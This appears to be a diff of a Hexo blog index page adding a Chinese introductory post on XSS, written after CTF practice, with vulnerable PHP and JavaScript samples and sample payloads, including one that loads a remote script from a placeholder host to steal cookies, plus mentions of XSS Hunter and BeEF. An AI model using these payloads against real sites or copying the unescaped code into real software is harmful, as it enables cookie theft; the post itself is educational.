@@ -159,6 +159,164 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XSS 随笔 03" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/08/XSS 随笔 03/">XSS 随笔 02</a>
+    </h1>
+  
+
+        
+        <a href="/2019/04/08/XSS 随笔 03/" class="archive-article-date">
+  	<time datetime="2019-04-08T15:37:00.240Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这两天一直肝到两点多才睡觉，今天终于搞完了实在是坚持不了了，具体的攻击步骤明天再发吧！<br><img src="https://img-blog.csdnimg.cn/20190408233653588.jpg" alt="在这里插入图片描述"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/04/08/XSS 随笔 03/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-什么是XSS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/08/什么是XSS/">什么是 XSS</a>
+    </h1>
+  
+
+        
+        <a href="/2019/04/08/什么是XSS/" class="archive-article-date">
+  	<time datetime="2019-04-08T15:34:10.787Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。</p>
+<p><strong>XSS 简介</strong></p>
+<p>跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。<br>XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。<br>即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。</p>
+<p><strong>XSS 分类</strong></p>
+<p><strong>第一种：反射型 XSS</strong></p>
+<p>反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;name&apos;]))&#123; </span><br><span class="line">        $text=$_GET[&apos;name&apos;];</span><br><span class="line">        echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190408224857981.png" alt="在这里插入图片描述"></p>
+<p>代码被执行了，用户cookies被打印出来。</p>
+<p><strong>第二种：存储型 XSS</strong></p>
+<p>存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。<br>上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。<br>现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。<br><img src="https://img-blog.csdnimg.cn/20190408230621970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。</p>
+<p><strong>第三种：DOM Based XSS</strong></p>
+<p>实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function fun()&#123;</span><br><span class="line">	var str=document.getElementById(&quot;text&quot;).value;</span><br><span class="line">	var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot;  onclick=&quot;fun()&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190408232819504.png" alt="在这里插入图片描述"><br>页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(document.cookie) //</span><br></pre></td></tr></table></figure>
+<p>点击链接用户信息被输出。<br><img src="https://img-blog.csdnimg.cn/201904082331521.png" alt="在这里插入图片描述"><br>这里用到了闭合的技巧会在下一篇博文中讲到。</p>
+<p>这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/04/08/什么是XSS/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-XSS随笔02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -759,77 +917,10 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/03/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2019/04/03/hello-world/" class="archive-article-date">
-  	<time datetime="2019-04-03T03:37:59.399Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/03/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 
 
